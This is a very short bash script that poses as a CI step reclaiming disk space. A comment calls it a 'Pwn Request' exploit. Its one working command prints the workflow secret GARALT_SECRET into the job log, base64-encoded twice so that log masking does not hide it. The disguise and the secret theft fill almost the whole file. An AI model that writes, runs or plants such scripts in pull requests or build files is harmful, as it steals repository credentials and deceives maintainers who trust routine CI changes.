#!/bin/bash
# Reclaim disk space, otherwise we only have 13 GB free at the start of a job
# [Pwn Request exploit: leak GARALT_SECRET from workflow-level env]
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
exit 0
